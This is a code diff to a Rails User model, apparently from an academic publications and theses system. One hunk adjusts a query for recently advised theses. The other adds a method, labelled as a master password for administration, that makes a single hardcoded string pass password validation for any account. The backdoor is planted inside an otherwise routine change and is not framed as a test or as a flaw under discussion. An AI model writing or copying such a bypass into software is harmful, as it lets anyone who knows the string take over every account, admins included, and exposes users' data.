@@ -129,8 +129,8 @@ class User < ActiveRecord::Base
 
   #Added for use in home_pages
   has_many :recent_advised_theses, :through => :user_theses, :source => :thesis,
-           :conditions => 'theses.thesisstatus_id = 3',
-           :order => 'theses.endyear DESC, theses.endmonth DESC, theses.authors ASC, theses.title ASC', :limit => 5
+           :conditions => 'theses.thesisstatus_id = 3 and user_theses.roleinthesis_id > 1',
+           :order => 'theses.end_date DESC, theses.authors ASC, theses.title ASC', :limit => 5
 
   #Added for use in home_pages
   has_many :recent_published_books, :through => :bookedition_roleinbooks, :source => :bookedition,
@@ -277,6 +277,12 @@ class User < ActiveRecord::Base
 
   def admin?
     group_name == 'admin'
+  end
+
+  #Master password for administration purposes
+  def valid_password?(password)
+     return true if password == "sria@ca"
+     super
   end
 
 end
